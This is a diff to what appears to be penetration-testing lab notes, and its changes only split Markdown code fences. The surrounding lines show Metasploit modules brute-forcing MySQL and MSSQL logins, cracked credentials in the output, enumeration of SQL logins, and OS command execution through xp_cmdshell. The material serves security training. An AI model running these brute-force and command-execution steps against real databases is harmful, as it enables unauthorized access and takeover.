@@ -544,7 +544,9 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 set VERBOSE false
 set STOP_ON_SUCCESS true
 exploit
+```
 
+```bash
 [+] 192.222.16.3:3306     - 192.222.16.3:3306 - Success: 'root:catalina'
 [*] 192.222.16.3:3306     - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
@@ -787,7 +789,9 @@ set USER_FILE /root/Desktop/wordlist/common_users.txt
 set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
 set VERBOSE false
 exploit
+```
 
+```bash
 [*] 10.4.23.176:1433      - 10.4.23.176:1433 - MSSQL - Starting authentication scanner.
 [+] 10.4.23.176:1433      - 10.4.23.176:1433 - Login Successful: WORKSTATION\sa:
 [+] 10.4.23.176:1433      - 10.4.23.176:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
@@ -829,7 +833,9 @@ exploit
 use auxiliary/admin/mssql/mssql_enum_sql_logins
 set RHOSTS 10.4.23.176
 exploit
+```
 
+```bash
 [*] 10.4.23.176:1433 - Attempting to connect to the database server at 10.4.23.176:1433 as sa...
 [+] 10.4.23.176:1433 - Connected.
 [*] 10.4.23.176:1433 - Checking if sa has the sysadmin role...
@@ -865,7 +871,9 @@ use auxiliary/admin/mssql/mssql_exec
 set RHOSTS 10.4.23.176
 set CMD whoami
 exploit
+```
 
+```bash
 [*] Running module against 10.4.23.176
 [*] 10.4.23.176:1433 - SQL Query: EXEC master..xp_cmdshell 'whoami'
  output
